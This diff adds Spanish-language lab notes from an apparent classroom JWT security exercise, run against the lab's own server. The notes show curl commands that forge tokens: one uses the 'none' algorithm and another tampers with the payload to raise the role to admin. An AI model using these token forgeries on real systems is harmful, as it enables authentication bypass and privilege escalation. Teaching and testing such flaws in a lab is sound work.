@@ -1,0 +1,67 @@
+--generar token 
+cd ~/jwt-lab
+curl -sk -X POST "https://100.68.106.47/token/generate?username=alumno1&role=user" | python3 -m json.tool
+
+
+--Request normal
+--cada parte de este codigo hace cosas diferentes
+--curl: es una herramienta para transferir datos desde o hacia un servidor
+--sk: son flags que le dicen a curl que no sea tan estricto con la seguridad
+---H: es una flag que le dice a curl que agregue un header personalizado
+--Authorization: Bearer $TOKEN: es el header que le dice a curl que agregue el token
+--https://192.168.0.158/private: es la URL del servidor
+--|: es un pipe que le dice a curl que envie la salida a python
+--python3 -m json.tool: es una herramienta que formatea el json
+
+curl -sk -H "Authorization: Bearer $TOKEN" https://192.168.0.158/private | python3 -m json.tool
+
+--Ataque ② — none algorithm
+HEADER_NONE=$(printf '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=' | tr -d '\n' | tr '+/' '-_')
+
+# El token tiene forma: PARTE1.PARTE2.PARTE3
+# Extrae la PARTE2 (payload)
+PAYLOAD_ORIGINAL=$(echo $TOKEN | cut -d'.' -f2)
+echo $PAYLOAD_ORIGINAL
+
+NONE_TOKEN="${HEADER_NONE}.${PAYLOAD_ORIGINAL}."
+echo $NONE_TOKEN
+
+curl -sk -H "Authorization: Bearer $NONE_TOKEN" https://192.168.0.158/private | python3 -m json.tool
+
+------------------------------------------------
+
+Ataque ② — Payload Tampering
+
+# 1. Asegúrate de tener tu token de usuario normal guardado en la variable (Pegalo entre las comillas)
+# TOKEN="eyJhbG..." 
+
+# 2. Extraer el encabezado y la firma ORIGINALES del token válido
+HEADER_ORIGINAL=$(echo $TOKEN | cut -d'.' -f1)
+FIRMA_ORIGINAL=$(echo $TOKEN | cut -d'.' -f3)
+
+# 3. Crear el payload modificado (falsificando el rol a admin y extendiendo la expiración)
+PAYLOAD_ADMIN=$(echo -n '{"sub":"alumno1","role":"admin","exp":9999999999}' | base64 | tr -d '=' | tr '+/' '-_')
+
+# 4. Ensamblar el token MALICIOSO pero con ESTRUCTURA CORRECTA
+# (Header original + Payload falso + Firma original)
+TAMPERED_TOKEN="${HEADER_ORIGINAL}.${PAYLOAD_ADMIN}.${FIRMA_ORIGINAL}"
+
+# 5. Intentar acceder al panel de admin usando la IP de Tailscale
+curl -sk -H "Authorization: Bearer $TAMPERED_TOKEN" https://100.68.106.47/admin | python3 -m json.tool
+
+
+--Ver los logs en tiempo real (en paralelo)
+--Abre tmux para ver ambas cosas a la vez:
+
+sudo apt install -y tmux
+tmux new-session \; split-window -h \; select-pane -t 0
+
+--Panel izquierdo — logs en vivo:
+tail -f ~/jwt-lab/requests.log | python3 -m json.tool
+
+
+https://192.168.0.158/dashboard
+
+--resquest POST
+# Generar token de admin directamente (solo el servidor con la clave puede hacer esto)
+curl -sk -X POST "https://100.68.106.47/token/generate?username=alumno2&role=admin" | python3 -m json.tool
